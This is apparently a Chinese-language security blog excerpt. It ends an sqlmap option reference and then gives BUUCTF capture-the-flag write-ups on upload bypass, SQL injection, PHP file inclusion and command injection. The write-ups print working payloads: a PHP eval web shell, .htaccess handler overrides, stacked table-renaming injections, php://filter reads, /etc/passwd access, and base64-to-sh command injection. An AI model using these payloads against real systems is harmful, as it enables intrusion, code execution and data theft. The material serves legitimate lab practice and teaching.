-<li>–regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</li>
-<li>–text-only 仅基于在文本内容比较网页</li>
-</ul>
-<h3 id="Techniques（技巧）："><a href="#Techniques（技巧）：" class="headerlink" title="Techniques（技巧）："></a>Techniques（技巧）：</h3><p>这些选项可用于调整具体的SQL注入测试。</p>
-<ul>
-<li>–technique&#x3D;TECH SQL注入技术测试（默认BEUST）</li>
-<li>–time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
-<li>–union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</li>
-<li>–union-char&#x3D;UCHAR 用于暴力猜解列数的字符</li>
-</ul>
-<h3 id="Fingerprint（指纹）："><a href="#Fingerprint（指纹）：" class="headerlink" title="Fingerprint（指纹）："></a>Fingerprint（指纹）：</h3><ul>
-<li>-f, –fingerprint 执行检查广泛的DBMS版本指纹</li>
-</ul>
-<h3 id="Brute-force（蛮力）："><a href="#Brute-force（蛮力）：" class="headerlink" title="Brute force（蛮力）："></a>Brute force（蛮力）：</h3><p>这些选项可以被用来运行蛮力检查。</p>
-<ul>
-<li>–common-tables 检查存在共同表</li>
-<li>–common-columns 检查存在共同列</li>
-</ul>
-<p>User-defined function injection（用户自定义函数注入）：<br> 这些选项可以用来创建用户自定义函数。</p>
-<p>–udf-inject 注入用户自定义函数<br> –shared-lib&#x3D;SHLIB 共享库的本地路径</p>
-<h3 id="File-system-access（访问文件系统）："><a href="#File-system-access（访问文件系统）：" class="headerlink" title="File system access（访问文件系统）："></a>File system access（访问文件系统）：</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
-<ul>
-<li>–file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</li>
-<li>–file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
-<li>–file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</li>
-</ul>
-<h3 id="Operating-system-access（操作系统访问）："><a href="#Operating-system-access（操作系统访问）：" class="headerlink" title="Operating system access（操作系统访问）："></a>Operating system access（操作系统访问）：</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
-<ul>
-<li>–os-cmd&#x3D;OSCMD 执行操作系统命令</li>
-<li>–os-shell 交互式的操作系统的shell</li>
-<li>–os-pwn 获取一个OOB shell，meterpreter或VNC</li>
-<li>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
-<li>–os-bof 存储过程缓冲区溢出利用</li>
-<li>–priv-esc 数据库进程用户权限提升</li>
-<li>–msf-path&#x3D;MSFPATH Metasploit Framework本地的安装路径</li>
-<li>–tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</li>
-</ul>
-<h3 id="Windows注册表访问："><a href="#Windows注册表访问：" class="headerlink" title="Windows注册表访问："></a>Windows注册表访问：</h3><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
-<ul>
-<li>–reg-read 读一个Windows注册表项值</li>
-<li>–reg-add 写一个Windows注册表项值数据</li>
-<li>–reg-del 删除Windows注册表键值</li>
-<li>–reg-key&#x3D;REGKEY Windows注册表键</li>
-<li>–reg-value&#x3D;REGVAL Windows注册表项值</li>
-<li>–reg-data&#x3D;REGDATA Windows注册表键值数据</li>
-<li>–reg-type&#x3D;REGTYPE Windows注册表项值类型</li>
-</ul>
-<p>这些选项可以用来设置一些一般的工作参数。</p>
-<ul>
-<li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
-<li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
-<li>–flush-session 刷新当前目标的会话文件</li>
-<li>–fresh-queries 忽略在会话文件中存储的查询结果</li>
-<li>–eta 显示每个输出的预计到达时间</li>
-<li>–update 更新SqlMap</li>
-<li>–save file保存选项到INI配置文件</li>
-<li>–batch 从不询问用户输入，使用所有默认配置。</li>
-</ul>
-<h3 id="Miscellaneous（杂项）："><a href="#Miscellaneous（杂项）：" class="headerlink" title="Miscellaneous（杂项）："></a>Miscellaneous（杂项）：</h3><ul>
-<li>–beep 发现SQL注入时提醒</li>
-<li>–check-payload IDS对注入payloads的检测测试</li>
-<li>–cleanup SqlMap具体的UDF和表清理DBMS</li>
-<li>–forms 对目标URL的解析和测试形式</li>
-<li>–gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
-<li>–page-rank Google dork结果显示网页排名（PR）</li>
-<li>–parse-errors 从响应页面解析数据库管理系统的错误消息</li>
-<li>–replicate 复制转储的数据到一个sqlite3数据库</li>
-<li>–tor 使用默认的Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</li>
-<li>–wizard 给初级用户的简单向导界面</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>tools</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buuctf</title>
-    <url>/2023/08/08/buuctf/</url>
-    <content><![CDATA[<h1 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h1><span id="more"></span>
-
-<p>1、后缀名不能有ph！对于文件后缀名的限制，无法绕过这里<br>2、上传类型也太露骨了吧！对Content-Type的限制，修改为image&#x2F;jpeg即可绕过<br>3、诶，别蒙我啊，这标志明显还是php啊</p>
-<p>对上传文件的内容进行了检测，不能含有&lt;?，这里的PHP版本为：PHP&#x2F;5.6.23，可以使用 绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;111&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>但是搭建到蚁剑上连接不成功</p>
-<p>上传一个.htaccess文件将别的后缀名文件内容解析为php程序</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .mochu</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805165204744.png" alt="image-20230805165204744"></p>
-<p>然后上传shell即可</p>
-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805165102425.png" alt="image-20230805165102425"></p>
-<p>用蚁剑创建数据</p>
-<p>找到根目录下的flag</p>
-<p>![屏幕截图 2023-08-05 150602](D:\Users\陈\Pictures\Screenshots\屏幕截图 2023-08-05 150602.png)</p>
-<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开靶机是一串代码<br>因为html 渲染过程中是不会把\n当做回车展示的，所以右键查看源代码，瞬间舒服了：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>
-
-<p>按行显示的题目代码“代码审计”<br>读代码可知拿到flag只需要满足俩条件：<br>1.让以get方式传参的两个变量gg和id满足md5后的值强比较相等，本身的值弱比较不相等<br>2.以post方式传参的变量password不是数字并且与数字1234567弱比较相等<br>由此，在url后追加?id[]&#x3D;1&amp;gg[]&#x3D;2就可以显示“You got the first step”的提示。但passwd参数还没有传，此时需要借助浏览器插件HackBar以post方式传入passwd&#x3D;1234567a<br>以get方式传参并使md5值相等<br>总结：<br>1.给数组类型的变量赋值不同的数值，可以满足变量的md5值在进行强比较时相等，又满足他们自身的值在进行弱比较时不相等。<br>2.在数字后面加个字母，就不再是数字但又可以满足和数字做弱比较时相等。</p>
-<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>这题目的名字一看就能猜到应该是文件上传了<br>打开靶机链接是这个样子的，我不知道这是什么梗<br>题目网页<br>因为类似的题上一篇已经写过了，这里就简写。这道题也是只能上传非php后缀的文件，然后再上传.htaccess文件，使服务器端将jpg看做php。<br>上传jpg格式的一句话木马：<br>一句话木马</p>
-<p>上传.htaccess时拦截包，修改文件类型为image&#x2F;jpeg：<br>上传.htaccess文件<br>.htaccess里写的内容：SetHandler application&#x2F;x-httpd-php</p>
-<p>上传1.jpg和.htaccess成功后，就可以用中国蚁剑连接了<br>url地址是：靶机的url&#x2F;upload&#x2F;随机生成的一串数&#x2F;1.jpg（即一句话木马文件上传到的路径）<br>密码是写在1.jpg里的111<br>测试连接，显示连接成功，点击添加，在服务器端的根目录可以找到flag</p>
-<h2 id="htaccess是什么"><a href="#htaccess是什么" class="headerlink" title="htaccess是什么"></a>htaccess是什么</h2><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
-<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
-<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config</p>
-<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
-<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>访问url</p>
-<p>重命名+堆叠注入</p>
-<p>1.判断是否存在注入，注入是字符型还是数字型</p>
-<p>输入1’发现不回显</p>
-<p>输入1’#显示正常</p>
-<p>应该是存在sql注入了</p>
-<p>输入1’ or ‘1’&#x3D;’1,正常回显，应该是字符型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>2.猜解SQL查询语句中的字段数</p>
-<p>输入1’ order by 3 # 回显出错，说明有两个字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error 1054 : Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>3.显示字段</p>
-<p>输入1′ union select 1,2 # 回显一个正则过滤规则</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
-
-<p>过滤了 select，update，delete，drop，insert，where 和 点</p>
-<p>过滤了这么多词，尝试堆叠注入</p>
-<p>4.查询数据库</p>
-<p>输入1’;show databases;# 成功回显</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>说明存在堆叠注入</p>
-<p>5.查询表</p>
-<p>输入1’;show tables;# 成功回显</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到两个表words和1919810931114514</p>
-<p>6.查询表中字段</p>
-<p>查看1919810931114514，输入1’; show columns from <code>1919810931114514</code>; #</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到1919810931114514中有我们想要的flag字段</p>
-<p>7.查询另一个表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>发现flag，因为查看flag的回显会出现在words里，为了回显在flag所属的表，而发现alter、rename又没有被过滤，则试着进行表和字段的重命名</p>
-<p>因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id(或data)。然后程序查询就能查询到原本‘1919810931114514’表中的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br><span class="line">#rename命令用于修改表名。</span><br><span class="line">#rename命令格式：rename table 原表名 to 新表名;</span><br><span class="line">#alert修改字段名及字段属性值</span><br><span class="line">alert table 表名 change 旧字段名 新字段名 新字段属性; </span><br></pre></td></tr></table></figure>
-
-<p>输入1’ or 1&#x3D;’1,查询就得到flag</p>
-<h1 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h1><p>打开页面只有一个a标签的超链接，指向的是?file&#x3D;flag.php。结合题目的名称不难联想到这是一题文件包含的题目。</p>
-<pre><code>看到当?file=flag.php时，页面返回Can you find out the flag。先输入?file=/etc/passwd，确认一下有没有返回，是否真的有文件包含的漏洞。
-</code></pre>
-<p>看到确实存在文件包含漏洞，目前又没有其他的信息。我们不知道真正的flag藏在那个页面中。所以只能先用文件包含漏洞中php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource伪协议帮我们返回已知页面的代码。输入<code>?file=php://filter/convert.base64-encode/resource=index.php</code>就能得到index.php的源代码的base64密文。解密后得到一下内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#x27;hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>大概意思就是过滤了php的几个伪协议，但刚好没过滤我们这个。<br>所以可以我们可以看到返回的结果<br>那现在就取一下flag.php的内容</p>
-<p> 输入?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php就能得到flag.php的源代码的base64密文。解密后得到一下内容里面就有flag：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">//flag&#123;ace2c6ad-88d7-4c5d-a49e-38baeba72c32&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><p>打开题目就看到大大的PING,二话不说直接ping个本地ip</p>
-<p>涉及知识点：</p>
-<pre><code>在命令执行的过程中，可以通过一些常用特殊字符来执行其他语句
-
-；  //命令分割符，即当执行完第一个命令，继续执行下一个命令
-
-|   //管道
-</code></pre>
-<p>那么尝试在当前文件夹下，有什么东西吧</p>
-<p>构造payload</p>
-<pre><code> 127.0.0.1;ls
-</code></pre>
-<p> 我们都知道在linux系统搭建的页面，通常显示页面的路径是&#x2F;var&#x2F;www&#x2F;html，那么我们尝试返回当前路径查找</p>
-<p>构造payload</p>
-<pre><code> 127.0.0.1;cd ../../../;ls
-</code></pre>
-<p>在返回前三层的时候找到了flag 字样</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
-
-<p>构造payload</p>
-<pre><code>127.0.0.1;cd ../../../;cat flag
-</code></pre>
-<p>flag{977043da-6f7d-4f7a-9e8e-2c65837cb657}</p>
-<h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>（1）页面里显示&#x2F;?ip&#x3D;,很明显要以ping的形式传一个参数给ip，并且我们要想执行其他命令，就要用命令分隔符也就是管道符连接，命令分隔符可以用”;“”|“”&amp;”三种，本题经过尝试发现第一步查看目录过滤了|，&amp;和空格。<br>这里介绍两种方式：<br>1.ping本地127.0.0.1<br>2.用||来代替127.0.0.1；<br>（2）虽然找到了放flag的文件，但是尝试后发现都不对，这里介绍一种思路，我们可以通过查看index.php的文件源码来查看源码，从而确认过滤了哪些东西，题目说过滤了命令连接符&amp;，\，空格，*，bash，&lt;&gt;，flag，？，我们得想一些其他方法来绕过<br>（3）要想得到flag了，我们需要绕过过滤掉的东西<br>这里介绍三种可以解决的特殊绕过方式：<br>1.拼接绕过法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>以上是题目给的绕过flag的源码，我们这里需要知道这是正则表达式匹配了ip的值中是否顺序出现了f、l、a、g四个字母。这样一来我们就可以拼接一个flag来绕过了，可以拼接f;lag fl;ag fla;g 但是这里需要注意：本题特殊就特殊在flag的字母顺序要不同（拼接绕过的一个大坑）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y=g;x=fla;$x$y</span><br><span class="line">y=ag;x=fl;$x$y</span><br><span class="line">y=lag;x=f;$x$y</span><br></pre></td></tr></table></figure>
-
-<p>构造payload：&#x2F;?ip&#x3D;||y&#x3D;ag;x&#x3D;fl;cat$IFS$9$x$y.php跑一下查看源码得到flag</p>
-<p>2.内联执行法<br>可以看到代码没有过滤掉符号&#96; 所以可以利用内联执行的方式直接打开flag文件,先执行命令ls，再把ls得到的文件名全部用命令cat打开，构建payload 跑一下，查看源码拿到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$6`ls`或者/?ip=||cat$IFS$6`ls`</span><br></pre></td></tr></table></figure>
-
-<p>3.sh编码绕过法(base64编码)</p>
-<p>使用方法：echo 命令编码|base64 -d|sh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh可以换成bash, 但是题目过滤掉了</span><br><span class="line">也可以换成其他的编码形式，这里用base64的</span><br><span class="line">空格用$IFS$6替换掉</span><br><span class="line">cat flag.php 的base64编码为Y2F0IGZsYWcucGhw</span><br></pre></td></tr></table></figure>
-
-<p>构造payload ， 相当于执行命令cat flag.php,查看源码得到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span><br><span class="line">/?ip=||echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span><br></pre></td></tr></table></figure>
-
-<h1 id="SUCTF-2019-EasySQL1"><a href="#SUCTF-2019-EasySQL1" class="headerlink" title="[SUCTF 2019]EasySQL1"></a>[SUCTF 2019]EasySQL1</h1><p>1.试试sql注入正常套路<br>（1）先试试1有回显<br>（2）再试试字母a没有回显<br>（3）试试单引号注入<code>1&#39; or &#39;1&#39;=&#39;1</code>,提示不一样，因此猜测这里有注入点<br>（4）试试有多少列,<code>1&#39; order by 4#</code>,还是不成功，因此一般的联合查询在这里不能使用<br>（5）基于时间的盲注和报错注入都需要嵌套联合查询语句来实现，因此可以跳过，直接试试布尔型盲注,<code>1&#39; and length(database())&gt;=1</code>还是不成功<br>2.利用堆叠注入<br>（1）查找所有数据库,1;show databases;#</p>
-<p>（2）查询所有表名,1;show tables;#</p>
-<p>（3）查询Flag表中的列,1;show columns from Flag#,不成功<br>3.接下来是网上的两种解法<br>（1）第一种是猜出了源码<strong>select $_POST[‘query’] || flag from Flag</strong>,<br>sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<br>第一种就按默认没有配置来进行，此时||就是逻辑或<br>||在命令执行中见过，<br>回顾:<br>command1;command2顺序执行<br>command1 || command2<br>如果command1执行失败，则执行command2<br>command1 &amp;&amp; command2<br>如果command1执行成功，则执行command2</p>
-<p>因此只需要将<br>$_POST[‘query’]</p>
-<p>提交的数据换成*,1(如果直接写的话会被报错，且写在后面会失效)<br>解释:<br>sql&#x3D;select.post[‘query’].”||flag from Flag”;（拼接语句）<br>如果$post[‘query’]的数据为  *,1</p>
-<p>sql语句就变成了select *,1||flag from Flag，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。<br>此处的1是临时增加一列，列名为1且这一列的所有值都为1</p>
-<p>执行payload：<code>*,1</code>,得到flag<br>（2）第二种是将||作为字符串连接符，因此需要在语句中更改其配置<br>sql_mode&#x3D;PIPES_AS_CONCAT时即可<br>Payload:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br>拼接完之后：select 1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1||flag from Flag<br>相当于是select 1 from Flag和select flag from Flag,得到flag</p>
-<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>先看一下题目,有注入点，这里怀疑是SQL注入</p>
-<p>先尝试读取一下index.php</p>
-<p>这里使用php伪协议</p>
-<p>payload：</p>
-<p>php:&#x2F;&#x2F;filter:&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
-<p>存在文件包含漏洞，但是这里报错了，分析之后是无法打开流：操作失败</p>
-<p>这里去除php后缀</p>
-<p>payload</p>
-<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index</p>
-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805171203176.png" alt="image-20230805171203176"></p>
-<p>解码之后找到index.php</p>
-<pre><code>&lt;?php
-                $file = $_GET[&#39;category&#39;];
-
-                if(isset($file))
-                &#123;
-                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
-                        include ($file . &#39;.php&#39;);
-                    &#125;
-                    else&#123;
-                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
-                    &#125;
-                &#125;
-                ?&gt;
-</code></pre>
-<p>传入的category参数必须有woofers,meowers,index才行</p>
-<p>这里构造payload来包含flag.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?category=woofers/../flag</span><br></pre></td></tr></table></figure>
-
-<p>这里使用的知识点是php:&#x2F;&#x2F;filter伪协议套协议</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?category=php://filter/convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure>
-
